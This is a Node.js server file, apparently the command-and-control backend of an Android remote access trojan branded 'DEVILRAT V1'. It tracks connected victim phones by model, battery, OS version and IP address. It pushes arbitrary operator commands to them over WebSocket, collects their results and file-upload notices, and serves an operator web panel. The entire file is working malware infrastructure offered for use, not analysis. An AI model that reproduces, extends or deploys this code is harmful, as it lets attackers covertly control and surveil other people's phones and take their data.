const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const { Server: WebSocketServer } = require('ws');
const { v4: uuidv4 } = require('uuid');
const cors = require('cors');
const path = require('path');

const app = express();
const server = http.createServer(app);

// Dual WebSocket support
const io = socketIo(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
  transports: ['websocket', 'polling']
});

const wss = new WebSocketServer({ server });

// DEVILRAT Database
const devices = new Map(); // deviceId -> {info, ws}
const commands = new Map();
const logs = [];

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// API Routes
app.get('/api/health', (req, res) => {
  res.json({
    status: 'online',
    service: 'DEVILRAT V1',
    developer: 'piwzsky',
    devices: devices.size,
    commands: commands.size,
    uptime: process.uptime()
  });
});

app.get('/api/devices', (req, res) => {
  const deviceList = Array.from(devices.values()).map(d => ({
    id: d.id,
    model: d.model,
    battery: d.battery,
    android: d.android,
    ip: d.ip,
    status: d.status,
    connected: d.connected,
    lastSeen: d.lastSeen
  }));
  res.json(deviceList);
});

app.post('/api/device/register', (req, res) => {
  const deviceId = uuidv4();
  const deviceInfo = {
    id: deviceId,
    model: req.body.model || 'Unknown',
    battery: req.body.battery || '100%',
    android: req.body.android || 'Unknown',
    version: req.body.version || 'Unknown',
    ip: req.ip,
    status: 'online',
    connected: new Date().toISOString(),
    lastSeen: Date.now(),
    socketType: 'http'
  };
  
  devices.set(deviceId, deviceInfo);
  logs.push({type: 'device_connected', deviceId, time: new Date()});
  
  io.emit('device_connected', deviceInfo);
  res.json({ status: 'registered', deviceId });
});

app.post('/api/command', (req, res) => {
  const { deviceId, command, params } = req.body;
  const device = devices.get(deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const commandId = uuidv4();
  const commandData = {
    id: commandId,
    deviceId,
    command,
    params: params || {},
    status: 'pending',
    createdAt: new Date().toISOString()
  };
  
  commands.set(commandId, commandData);
  logs.push({type: 'command_sent', deviceId, command, time: new Date()});
  
  // Send via WebSocket if connected
  if (device.ws && device.ws.readyState === 1) {
    device.ws.send(JSON.stringify({
      type: 'command',
      ...commandData
    }));
  }
  
  io.emit('command_sent', commandData);
  res.json({ status: 'sent', commandId });
});

// WebSocket (Socket.IO) for Web Clients
io.on('connection', (socket) => {
  console.log('Web client connected:', socket.id);
  
  socket.on('get_devices', () => {
    socket.emit('device_list', Array.from(devices.values()));
  });
  
  socket.on('send_command', (data) => {
    const { deviceId, command, params } = data;
    const device = devices.get(deviceId);
    
    if (device && device.ws && device.ws.readyState === 1) {
      const commandId = uuidv4();
      const commandData = {
        id: commandId,
        deviceId,
        command,
        params,
        status: 'sent',
        createdAt: new Date().toISOString()
      };
      
      device.ws.send(JSON.stringify({
        type: 'command',
        ...commandData
      }));
      
      commands.set(commandId, commandData);
      io.emit('command_sent', commandData);
      socket.emit('command_ack', { commandId });
    }
  });
  
  socket.on('disconnect', () => {
    console.log('Web client disconnected:', socket.id);
  });
});

// Raw WebSocket for Android APK
wss.on('connection', (ws, req) => {
  const deviceId = uuidv4();
  const ip = req.socket.remoteAddress;
  
  console.log('Android device connected via WebSocket:', deviceId);
  
  const deviceInfo = {
    id: deviceId,
    model: 'Android Device',
    battery: '100%',
    android: 'Unknown',
    ip: ip,
    status: 'online',
    connected: new Date().toISOString(),
    lastSeen: Date.now(),
    ws: ws,
    socketType: 'websocket'
  };
  
  devices.set(deviceId, deviceInfo);
  ws.deviceId = deviceId;
  
  // Send welcome message
  ws.send(JSON.stringify({
    type: 'registered',
    deviceId: deviceId,
    server: 'DEVILRAT V1',
    timestamp: new Date().toISOString()
  }));
  
  // Broadcast to web clients
  io.emit('device_connected', deviceInfo);
  
  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      
      // Device info update
      if (data.type === 'device_info') {
        deviceInfo.model = data.model || deviceInfo.model;
        deviceInfo.battery = data.battery || deviceInfo.battery;
        deviceInfo.android = data.android || deviceInfo.android;
        deviceInfo.lastSeen = Date.now();
        
        io.emit('device_update', deviceInfo);
      }
      
      // Command response
      if (data.type === 'command_response') {
        const command = commands.get(data.commandId);
        if (command) {
          command.status = 'completed';
          command.result = data.result;
          command.completedAt = new Date().toISOString();
          
          io.emit('command_completed', command);
        }
      }
      
      // File upload notification
      if (data.type === 'file_uploaded') {
        io.emit('file_uploaded', {
          deviceId: deviceId,
          filename: data.filename,
          size: data.size,
          timestamp: new Date().toISOString()
        });
      }
      
    } catch (err) {
      console.error('WebSocket message error:', err);
    }
  });
  
  ws.on('close', () => {
    const device = devices.get(deviceId);
    if (device) {
      device.status = 'offline';
      device.lastSeen = Date.now();
      io.emit('device_disconnected', device);
      devices.delete(deviceId);
    }
    console.log('Android device disconnected:', deviceId);
  });
  
  // Heartbeat
  const heartbeat = setInterval(() => {
    if (ws.readyState === 1) {
      ws.send(JSON.stringify({ type: 'ping' }));
    } else {
      clearInterval(heartbeat);
    }
  }, 30000);
});

// Serve Web Panel
app.get('/panel', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/', (req, res) => {
  res.redirect('/panel');
});

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`
  👹 DEVILRAT V1 - KOYEB EDITION
  📡 Server running on port ${PORT}
  🔗 Web Panel: http://localhost:${PORT}/panel
  ⚡ WebSocket: ws://localhost:${PORT}
  📱 API: http://localhost:${PORT}/api
  👨‍💻 Developer: piwzsky
  🛐 KEGELAPAN ABADI!
  `);
});

// Cleanup stale devices
setInterval(() => {
  const now = Date.now();
  devices.forEach((device, id) => {
    if (now - device.lastSeen > 60000) {
      device.status = 'offline';
      io.emit('device_update', device);
    }
    if (now - device.lastSeen > 300000) {
      devices.delete(id);
    }
  });
}, 30000);
